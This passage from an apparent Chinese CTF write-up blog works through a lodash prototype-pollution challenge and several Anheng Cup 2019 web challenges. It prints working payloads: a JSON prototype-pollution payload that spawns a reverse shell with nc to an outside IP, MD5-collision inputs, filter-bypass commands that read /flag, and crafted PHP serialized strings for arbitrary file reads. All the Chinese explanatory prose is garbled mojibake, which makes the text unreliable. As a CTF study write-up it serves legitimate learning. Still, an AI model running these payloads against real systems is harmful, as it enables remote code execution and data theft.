src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h2 id="code-breaking-thejs"><a href="#code-breaking-thejs" class="headerlink" title="code-breaking thejs"></a>code-breaking thejs</h2><p>å¼€å¤´æåˆ°äº†pç‰›çŸ¥è¯†æ˜Ÿçƒçš„è¿™é“é¢˜ï¼Œé‚£ä¹ˆç°åœ¨å†æ¥çœ‹çœ‹ï¼š</p><pre><code class="javascript">const fs = require(&#39;fs&#39;)const express = require(&#39;express&#39;)const bodyParser = require(&#39;body-parser&#39;)const lodash = require(&#39;lodash&#39;)const session = require(&#39;express-session&#39;)const randomize = require(&#39;randomatic&#39;)const app = express()app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())app.use(&#39;/static&#39;, express.static(&#39;static&#39;))app.use(session({    name: &#39;thejs.session&#39;,    secret: randomize(&#39;aA0&#39;, 16),    resave: false,    saveUninitialized: false}))app.engine(&#39;ejs&#39;, function (filePath, options, callback) { // define the template engine    fs.readFile(filePath, (err, content) =&gt; {        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled({...options})        return callback(null, rendered)    })})app.set(&#39;views&#39;, &#39;./views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;/&#39;, (req, res) =&gt; {    let data = req.session.data || {language: [], category: []}    if (req.method == &#39;POST&#39;) {        data = lodash.merge(data, req.body)        req.session.data = data    }    res.render(&#39;index&#39;, {        language: data.language,         category: data.category    })})app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))</code></pre><p>æ¼æ´ç‚¹éå¸¸æ¸…æ™°ï¼Œå°±æ˜¯ä¸€ä¸ªPOSTå¤„ç”¨åˆ°äº†merge,æ˜¾ç„¶å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚é‚£ä¹ˆå…³é”®å‡½æ•°éœ€è¦å»çœ‹çœ‹ï¼Œæ‰€ä»¥éœ€è¦å‚è€ƒlodashçš„ä»£ç ï¼ˆlodashæ˜¯ä¸€ä¸ªè¾…åŠ©åŠŸèƒ½é›†ï¼Œè¿™é‡Œä¸»è¦ç”¨åˆ°çš„è¿˜æ˜¯<code>lodash.merge</code>å’Œ<code>lodash.template</code>ï¼‰å¦‚æœå»å®¡è®¡æºç ï¼Œä¼šå‘ç°è¿™æ ·ä¸€ä¸ªå±æ€§<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank" rel="noopener">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a>åŠå¯¹åº”æºç ï¼Œå’Œåé¢çš„è°ƒç”¨ã€‚</p><pre><code class="javascript">var sourceURL = &#39;sourceURL&#39; in options ? &#39;//# sourceURL=&#39; + options.sourceURL + &#39;\n&#39; : &#39;&#39;;// ...var result = attempt(function() {  return Function(importsKeys, sourceURL + &#39;return &#39; + source)  .apply(undefined, importsValues);});</code></pre><p>å¼€å§‹<code>sourceURL</code>æ˜¯ç©ºå€¼ï¼Œä½†æ˜¯åé¢å®ƒä½œä¸ºnew Functionçš„ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚<br>æ‰€ä»¥payloadå¦‚ä¸‹ï¼š</p><pre><code class="javascript">{&quot;__proto__&quot;:{&quot;sourceURL&quot;:&quot;\u000aglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc 120.27.246.202 8888 -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="payload"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤å¤„çš„<code>/u000a</code>å¿…ä¸å¯å°‘,è¿™æ—¶jsonä¸­çš„æ¢è¡Œã€‚å¹¶ä¸”ä¸€å®šè¦æŠŠ<code>Content-Type</code>å¿…é¡»è®¾ç½®æˆ<code>application/json</code>ã€‚å¦åˆ™<code>__proto__</code>ä¼šè¢«å¤„ç†æˆå­—ç¬¦ä¸²ã€‚<br>è¿™é‡ŒåŒæ ·ä½¿ç”¨è·Ÿhgameé‚£é“é¢˜ä¸€æ ·çš„å¼¹shellæ‰‹æ®µã€‚å¯ä»¥æ‹¿åˆ°shell<br>åŒæ—¶å› ä¸ºä¸çŸ¥é“æ–‡ä»¶åï¼Œä½¿ç”¨<code>cat /fl*</code>æ¥æ¨¡ç³Šå¤„ç†ã€‚<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œpç‰›å¯¹æ­¤é¢˜çš„payloadé¢å¤–å¸¦äº†ä¸€ä¸ªforå¾ªç¯</p><pre><code>for (var a in{}) {delete Object.prototype[a]}</code></pre><p>åˆ æ‰æ±¡æŸ“çš„åŸå‹ã€‚è¿™æ—¶å› ä¸ºåŸå‹æ±¡æŸ“è¿™ä¸€æ¼æ´é™¤éæ•´ä¸ªç¨‹åºé‡å¯ï¼Œå¦åˆ™æ‰€æœ‰çš„å¯¹è±¡éƒ½ä¼šè¢«æ±¡æŸ“ä¸å½±å“ã€‚è¿™æ ·åœ¨awdç­‰ç­‰æ¯”èµ›ä¸­ä¸€æ—¦ä½ æ‹¿åˆ°flag,å°±æœ‰å¯èƒ½è¢«åˆ«äººç›´æ¥è®¿é—®åˆ°ã€‚</p><p>æ€»ç»“ä¸‹ï¼š<br>1.åŸå‹é“¾æ±¡æŸ“å±äºå‰ç«¯æ¼æ´åº”ç”¨ï¼ŒåŸºæœ¬ä¸Šéœ€è¦æºç å®¡è®¡åŠŸåŠ›æ¥è¿›è¡Œè§£å†³ï¼›æ‰¾åˆ°<code>merge(),clone()</code>åªæ˜¯ç¡®å®šæ¼æ´çš„å¼€å§‹<br>2.è¿›è¡Œå®¡è®¡éœ€è¦ä»¥è¾¾æˆRCEä¸ºä¸»è¦ç›®çš„ã€‚é€šå¸¸<code>exec, return</code>ç­‰ç­‰éƒ½æ˜¯å€¼å¾—æ³¨æ„çš„å…³é”®å­—ã€‚<br>3.é¢˜ç›®åŸºæœ¬æ˜¯ä»¥å¼¹shellä¸ºæœ€ç»ˆç›®çš„ã€‚ç›®å‰æ¥çœ‹å¾ˆå¤šNode.jsä¼ ç»Ÿå¼¹shellæ–¹å¼å¹¶ä¸é€‚ç”¨.wget,curl,ä»¥åŠæˆ‘ä¸¤é“é¢˜éƒ½ç”¨åˆ°çš„ncæ¯”è¾ƒé€‚ç”¨ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.anquanke.com/post/id/176884#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176884#h3-5</a><br><a href="https://xz.aliyun.com/t/2802" target="_blank" rel="noopener">https://xz.aliyun.com/t/2802</a><br><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ´µæ¯2019-webå¤ç°</title>
      <link href="2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>å‘ç°buuojä¸Šå®‰æ´µ2019çš„é¢˜ç›®æœ‰ç°æˆçš„ï¼Œä¸ç”¨åœ¨vpsä¸Šæ­äº†(ç¬¬ä¸€é¢˜é™¤å¤–ï¼Œæ­å¥½æ‰å‘ç°â€¦â€¦)ï¼Œåˆšå¥½åšåšã€‚</p><a id="more"></a><h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h1><p>è¿›å»åurlæœ‰ä¸¤ä¸ªæ˜æ˜¾å‚æ•°ï¼Œç¬¬ä¸€ä¸ªç±»ä¼¼äºbase64ç¼–ç ï¼Œç¬¬äºŒä¸ªç”±å‚æ•°åçŸ¥é“å¯èƒ½æ˜¯rceå‚æ•°</p><pre><code>?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code></pre><p>å…ˆè§£ç å‰é¢ä¸€ä¸ªå‚æ•°çš„å€¼ï¼Œå‘ç°base64è§£äº†ä¸¤æ¬¡åå¾—åˆ°ä¸€ä¸²æ•°å­—ï¼Œçœ‹èµ·æ¥åƒåå…­è¿›åˆ¶å­—ç¬¦ã€‚å°è¯•16è¿›åˆ¶è§£ç åå¾—åˆ°<code>555.pnf0</code>è¯å®äº†åŠ å¯†æ–¹å¼ã€‚<br>åŠ ä¸Šå›¾ç‰‡çš„å›æ˜¾æœ‰base64çš„å†…å®¹ï¼Œå¯çŸ¥imgå‚æ•°ç”¨äºæ–‡ä»¶åŒ…å«ï¼Œé‚£ä¹ˆåŒ…å«ä¸‹index.phpå§</p><pre><code class="python">import base64import binasciistr=&#39;index.php&#39;filename = str.encode(encoding=&#39;utf-8&#39;)hex = binascii.b2a_hex(filename)print(hex)base1 = base64.b64encode(hex)base2 = base64.b64encode(base1)print(base2.decode(&#39;utf-8&#39;))</code></pre><p>å¾—åˆ°æºç </p><pre><code class="php">&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text/html;charset=utf-8&#39;);$cmd = $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;]))     header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) {    echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;    die(&quot;xixiï½ no flag&quot;);} else {    $txt = base64_encode(file_get_contents($file));    echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;}echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) {    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;} else {    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) {        echo `$cmd`;    } else {        echo (&quot;md5 is funny ~&quot;);    }}?&gt;&lt;html&gt;&lt;style&gt;  body{   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;}&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>ç¬¬ä¸€ä¸ªå‚æ•°å·²ç»åˆ©ç”¨å®Œäº†ï¼Œè€Œç¬¬äºŒä¸ªå‚æ•°ç”¨äºrce,ä½†æ˜æ˜¾è¿‡æ»¤äº†è®¸å¤šè¯»å–æ–‡ä»¶çš„å‘½ä»¤ã€‚<br>åŒæ—¶å¯çŸ¥è¦æ‰§è¡Œå‘½ä»¤å¿…é¡»ç»•è¿‡ä¸€å±‚MD5å¯¹æ¯”ã€‚åŸºäºä½¿ç”¨äº†phpå¼ºç›¸ç­‰ç¬¦å·ï¼Œå¯çŸ¥ä¸€å®šè¦æ‰¾åˆ°ä¸€å¯¹MD5ç›¸åŒçš„ä¸åŒå­—ç¬¦ä¸²ã€‚å¯ä»¥ç”¨æŸç§MD5ç¢°æ’ç”Ÿæˆå™¨å¾—åˆ°ã€‚æˆ‘ç›´æ¥ç”¨å®˜æ–¹wpé‡Œçš„å§</p><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>ä¹‹åå°±æ˜¯æ‰§è¡Œå‘½ä»¤äº†ã€‚ç›´æ¥åˆ©ç”¨åŒ¹é…æ­£åˆ™é‡Œé¢<code>\</code>çš„ç–å¿½ï¼Œç”¨å®ƒä½¿æˆ‘ä»¬çš„å…³é”®å­—æ„å»ºå‡ºæ¥</p><pre><code>ca\t%20/flag                    cat /flag</code></pre><p>æˆ–è€…ä½¿ç”¨æ²¡è¢«è¿‡æ»¤çš„è¯»å–æ–‡ä»¶çš„å‘½ä»¤</p><pre><code>sort /flag</code></pre><p><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h1 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h1><p>é¢˜ç›®å¯¹æˆ‘æœ‰ç‚¹éš¾ï¼Œä½†æ˜¯æ‰“å¼€äº†ååºåˆ—åŒ–æ–°ä¸–ç•Œçš„å¤§é—¨<br>ä¸€é“ååºåˆ—åŒ–åˆ©ç”¨é¢˜ï¼Œä¸Šæ¥ç›´æ¥ç»™äº†æºç </p><pre><code class="php">&lt;?php$function = @$_GET[&#39;f&#39;];function filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}if($_SESSION){    unset($_SESSION);}$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function){    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;}if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;){    highlight_file(&#39;index.php&#39;);}else if($function == &#39;phpinfo&#39;){    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!}else if($function == &#39;show_image&#39;){    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));}</code></pre><p>æ€è·¯ä¸Šé¦–å…ˆçœ‹çœ‹å¯æ§çš„å‚æ•°ï¼Œæœ‰getä¼ å€¼çš„<code>f,img_path</code>ã€‚ä½†æ˜¯æ³¨æ„åˆ°<code>img_path</code>æ­é…ä¸Š<code>f</code>ä¸º<code>show_image</code>æ—¶ï¼Œè¿”å›çš„å†…å®¹å¹¶ä¸å¯ç”¨ï¼Œå› ä¸º</p><pre><code>$_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));</code></pre><p>ä¸­ï¼Œæˆ‘ä»¬ä¼ çš„å€¼ç»è¿‡sha1åŠ å¯†åå¹¶æ²¡æœ‰è§£å¯†ï¼Œæ•…ä¸å¯ç”¨ã€‚<br>æ­¤æ—¶å…³æ³¨å…¶ä»–é‡ç‚¹,æœ‰ä¸€å¥</p><pre><code>extract($_POST);</code></pre><p>æ˜¯ä¸€ä¸ªå˜é‡è¦†ç›–çš„åˆ©ç”¨ã€‚æ‰€ä»¥æˆ‘ä»¬çš„å˜é‡å€¼éƒ½å¯ä»¥é€šè¿‡postæ“ä½œæ”¹å˜ï¼Œè¿™æ ·å¯æ§çš„å‚æ•°å¤šäº†èµ·æ¥ã€‚<br>åŒæ—¶æ³¨æ„åˆ°åºåˆ—åŒ–è¯­å¥ï¼Œä¼šåœ¨è°ƒç”¨<code>show_image</code>æ—¶è¢«è§¦å‘</p><pre><code>$serialize_info = filter(serialize($_SESSION));</code></pre><p>æ¼æ´ç‚¹æ­£åœ¨äºæ­¤ï¼Œåœ¨åºåˆ—åŒ–æ•°æ®ä¹‹åï¼Œå®ƒç»è¿‡äº†ä¸€å±‚è¿‡æ»¤æ‰ç»™å˜é‡èµ‹å€¼ã€‚è€Œä»æœ€ä¸Šæ–¹çš„è¿‡æ»¤å‡½æ•°å¯çŸ¥ï¼Œå‡ºç°è¢«è¿‡æ»¤çš„å…³é”®å­—ç›´æ¥æ›¿æ¢ä¸ºç©ºã€‚é‚£ä¹ˆè¿™æ˜¯å¦ä¼šæœ‰æ¼æ´å¯ä»¥ç”¨å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚å‡ºé¢˜äººå¦‚æ˜¯è¯´ï¼š</p><blockquote><p>ä»»ä½•å…·æœ‰ä¸€å®šç»“æ„çš„æ•°æ®ï¼Œå¦‚æœç»è¿‡äº†æŸäº›å¤„ç†è€ŒæŠŠç»“æ„ä½“æœ¬èº«çš„ç»“æ„ç»™æ‰“ä¹±äº†ï¼Œåˆ™æœ‰å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ã€‚</p></blockquote><p>å…¶æ„ä¹‰åœ¨äºï¼Œç»™<code>user</code>æ‰€èµ‹çš„å€¼åˆšå¥½24ä¸ªï¼Œè€Œè¿™24ä¸ªå­—ç¬¦ç”±äºè¿‡æ»¤<code>flag</code>çš„åŸå› ï¼Œåœ¨ç»è¿‡åºåˆ—åŒ–åè¢«ç½®ä¸ºç©ºã€‚è¿™æ—¶å°±å¯ä»¥åæ‰ä¸€ä¸ªfunctionï¼Œåšåˆ°ä»»æ„è¯»å–æ–‡ä»¶ã€‚</p><p>é¦–å…ˆä»æç¤ºphpinfoå¤„æ‰¾åˆ°ä¸€ä¸ªä¸å¯ç›´æ¥è¯»çš„phpæ–‡ä»¶ï¼Œæˆ‘ä»¬å…ˆå°è¯•åˆ©ç”¨æ¼æ´è¯»å–å®ƒçœ‹çœ‹ã€‚ï¼ˆç”±äºå…³é”®å­—é‡Œè¿‡æ»¤äº†f1agï¼Œæ‰€ä»¥åœ¨phpinfoç•Œé¢æœf1agå…³é”®å­—ï¼Œæœæ–­å‘ç°d0g3_f1ag.phpï¼‰<br>ä¸‹é¢æˆ‘æ¥æ„é€ ä¸‹åºåˆ—åŒ–çš„ç±»ï¼Œä»æºç çŸ¥é“SESSIONç±»æœ‰ä¸‰ä¸ªå±æ€§ï¼š</p><pre><code class="php">&lt;?phpclass SESSION{    var $user=&quot;flagflagflagflagflagflag&quot;;    var $function=&#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;}&#39;;# å…¶ä¸­ä¸ºd0g3_f1ag.php base64ç¼–ç     var $img=&quot;MS5qcGc=&quot;;# å€¼ä¸º1.jpgçš„base64ç¼–ç }$a=new SESSION();echo(serialize($a));</code></pre><p>ç”Ÿæˆçš„payloadå¦‚ä¸‹ï¼š</p><pre><code class="php">O:7:&quot;SESSION&quot;:3:{s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:8:&quot;MS5qcGc=&quot;;}</code></pre><p>è€Œç»è¿‡è¿‡æ»¤å</p><pre><code class="php">O:7:&quot;SESSION&quot;:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:8:&quot;MS5qcGc=&quot;;}</code></pre><p>æ­¤æ—¶userå±æ€§å¯¹åº”çš„å€¼è¢«ç½®ç©ºï¼Œé‚£ä¹ˆå®ƒå°±è¦å»æŠŠåé¢çš„24ä¸ªå­—ç¬¦ç½®ä¸ºå®ƒçš„å€¼ã€‚ä¹Ÿå°±æ˜¯</p><pre><code class="php">&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;</code></pre><p><strong>ç›¸å½“äºåæ‰äº†functionå±æ€§</strong>ï¼Œä½†æ˜¯æˆ‘ä»¬æ„é€ çš„<code>$function</code>ä¸­ï¼ŒåŒ…å«äº†<code>img</code>å±æ€§çš„å€¼ï¼Œä»¥åŠæ„é€ çš„ä¸€ä¸ª<code>test</code>å±æ€§çš„å€¼ï¼Œä½¿å¾—æˆ‘ä»¬çš„åºåˆ—åŒ–æ•°æ®ä»ç„¶æ˜¯æ»¡è¶³ä¸€ä¸ªç±»å¯¹åº”ä¸‰ä¸ªé”®å€¼ã€‚è¿™æ—¶å®ƒå¯¹åºåˆ—åŒ–æ•°æ®çš„åŒ¹é…å°±æ˜¯ç”±<code>{</code>å¼€å§‹ï¼Œåˆ°<code>}</code>ç»“æŸã€‚æ‰€ä»¥åé¢å¤šä½™çš„å­—ç¬¦<code>&quot;;s:3:&quot;img&quot;;s:8:&quot;MS5qcGc=&quot;;}</code>å…¨éƒ¨è¢«å¿½ç•¥ã€‚<br>è¿™æ ·ï¼Œæˆ‘ä»¬é€šè¿‡æ§åˆ¶functionå±æ€§çš„å€¼ï¼Œè¾¾åˆ°äº†æ§åˆ¶<code>img</code>å±æ€§å€¼çš„æ•ˆæœï¼Œä»è€Œè§¦å‘ååºåˆ—åŒ–ï¼Œè¯»å–æ–‡ä»¶ã€‚<br>æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p><pre><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;}&amp;function=show_image</code></pre><p>(functionä¹Ÿå¯ä»¥ç›´æ¥getä¼ )<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>å¦å¤–é¢˜ç›®æ„é€ çš„å…¶å®æ˜¯SESSIONæ•°ç»„è¿›è¡Œåºåˆ—åŒ–ï¼Œä½†æ˜¯åºåˆ—åŒ–æ ¼å¼ä¸€æ ·ï¼Œéƒ½å¯è¡Œã€‚</p><pre><code class="php">&lt;?php$b=array(&quot;user&quot;=&gt;&quot;flagflagflagflagflagflag&quot;,    &quot;function&quot;=&gt;&#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;}&#39;,    &quot;img&quot;=&gt;&quot;MS5qcGc=&quot;);echo(serialize($b));</code></pre><h1 id="ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "><a href="#ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "></a>ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h1><p>ä¹Ÿæ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜ç›®ï¼Œæ„å›¾åœ¨äºååºåˆ—åŒ–ç»“åˆsqlæ³¨å…¥ã€‚åœ¨æºç å®¡è®¡ä¸Šä¸‹äº†ä¸å°‘åŠŸå¤«ã€‚å¦‚æœæˆ‘åœ¨æ¯”èµ›ä¸­åšå¤šåŠä¼šå¡åœ¨sqlæ³¨å…¥ä¸Šå§ã€‚</p><p>é¦–å…ˆè¿›å…¥é¡µé¢ï¼Œå¯ä»¥å‘ç°ç½‘ç«™åº•éƒ¨ç•™ä¸‹äº†wowouploadimageï¼Œå¯ä»¥æ‹¿åˆ°ä¸€ä»½æºç ã€‚ä¸»è¦å†…å®¹å¦‚ä¸‹ï¼š<br>upload.php</p><pre><code class="php">&lt;?phpinclude(&quot;./helper.php&quot;);class upload extends helper {    public function upload_base(){        $this-&gt;upload();    }}if ($_FILES){    if ($_FILES[&quot;file&quot;][&quot;error&quot;]){        die(&quot;Upload file failed.&quot;);    }else{        $file = new upload();        $file-&gt;upload_base();    }}$a = new helper();?&gt;</code></pre><p>show.php</p><pre><code class="php">&lt;?phpinclude(&quot;./helper.php&quot;);$show = new show();if($_GET[&quot;delete_all&quot;]){    if($_GET[&quot;delete_all&quot;] == &quot;true&quot;){        $show-&gt;Delete_All_Images();    }}$show-&gt;Get_All_Images();class show{    public $con;    public function __construct(){        $this-&gt;con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;pic_base&quot;);        if (mysqli_connect_errno($this-&gt;con)){                die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());        }    }    public function Get_All_Images(){        $sql = &quot;SELECT * FROM images&quot;;        $result = mysqli_query($this-&gt;con, $sql);        if ($result-&gt;num_rows &gt; 0){            while($row = $result-&gt;fetch_assoc()){                if($row[&quot;attr&quot;]){                    $attr_temp = str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);                    $attr = unserialize($attr_temp);                }                echo &quot;&lt;p&gt;id=&quot;.$row[&quot;id&quot;].&quot; filename=&quot;.$row[&quot;filename&quot;].&quot; path=&quot;.$row[&quot;path&quot;].&quot;&lt;/p&gt;&quot;;            }        }else{            echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;;        }        mysqli_close($this-&gt;con);    }    public function Delete_All_Images(){        $sql = &quot;DELETE FROM images&quot;;        $result = mysqli_query($this-&gt;con, $sql);    }}?&gt;</code></pre><p>helper.php</p><pre><code class="php">&lt;?phpclass helper {    protected $folder = &quot;pic/&quot;;    protected $ifview = False;     protected $config = &quot;config.txt&quot;;    // The function is not yet perfect, it is not open yet.    public function upload($input=&quot;file&quot;)    {        $fileinfo = $this-&gt;getfile($input);        $array = array();        $array[&quot;title&quot;] = $fileinfo[&#39;title&#39;];        $array[&quot;filename&quot;] = $fileinfo[&#39;filename&#39;];        $array[&quot;ext&quot;] = $fileinfo[&#39;ext&#39;];        $array[&quot;path&quot;] = $fileinfo[&#39;path&#39;];        $img_ext = 